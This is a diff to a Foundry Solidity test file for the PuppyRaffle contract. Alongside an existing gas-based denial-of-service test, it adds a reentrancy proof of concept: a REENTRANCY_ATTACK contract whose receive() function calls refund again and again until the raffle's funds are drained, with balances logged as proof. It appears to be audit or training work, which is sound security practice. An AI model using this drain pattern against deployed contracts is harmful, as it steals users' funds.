@@ -223,7 +223,6 @@ contract PuppyRaffleTest is Test {
         console.log(gases);
 
         //the gas is astronomically high for second 100 players
-        
 
         address[] memory DoS_arraySecond = new address[](playerNumber);
         for (uint160 i = 0; i < playerNumber; i++) {
@@ -235,13 +234,73 @@ contract PuppyRaffleTest is Test {
         console.log(gasesSecond);
         assert(gases < gasesSecond);
     }
-    function testCanEnterRaffle() public {
-        address[] memory players = new address[](1);
+
+    function testCanEnterRaffleReentrancy() public {
+        //legitimate participants of the PuppyRaffle
+        address[] memory players = new address[](4);
+
         players[0] = playerOne;
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
-        assertEq(puppyRaffle.players(0), playerOne);
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        uint raffleBalance_beforeAttack = address(puppyRaffle).balance;
+
+        //An attacker enters the raffle with the intention of stealing all funds
+        //in the puppyRaffle contract
+
+        REENTRANCY_ATTACK AttackContract = new REENTRANCY_ATTACK(puppyRaffle);
+        // address prankin = address(Attack);
+        address attacker = makeAddr("Attacker");
+
+        vm.deal(attacker, 2 ether);
+
+        vm.prank(attacker);
+        AttackContract.lets_play{value: entranceFee}();
+
+        //Sending payload-
+        AttackContract.attack();
+
+        //Raffle balance after successful attack
+        uint raffleBalance_afterAttack = address(puppyRaffle).balance;
+
+        //attack contract balance after attack
+        uint attackBalance = address(AttackContract).balance;
+
+        //PROOF
+        console.log("raffle balance before attack", raffleBalance_beforeAttack);
+        console.log("raffle balance after attack", raffleBalance_afterAttack);
+
+        console.log("AttackContract balance after attack", attackBalance);
     }
-    
+}
 
+contract REENTRANCY_ATTACK {
+    PuppyRaffle puppyRaffle;
+    uint public playerIndex;
+    uint public entranceFee;
 
+    constructor(PuppyRaffle raffle) {
+        puppyRaffle = raffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function lets_play() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+    }
+
+    function attack() public {
+        puppyRaffle.refund(playerIndex);
+    }
+
+    receive() external payable {
+        if (address(puppyRaffle).balance >= 1 ether) {
+            puppyRaffle.refund(playerIndex);
+        }
+    }
+
+    fallback() external payable {}
 }
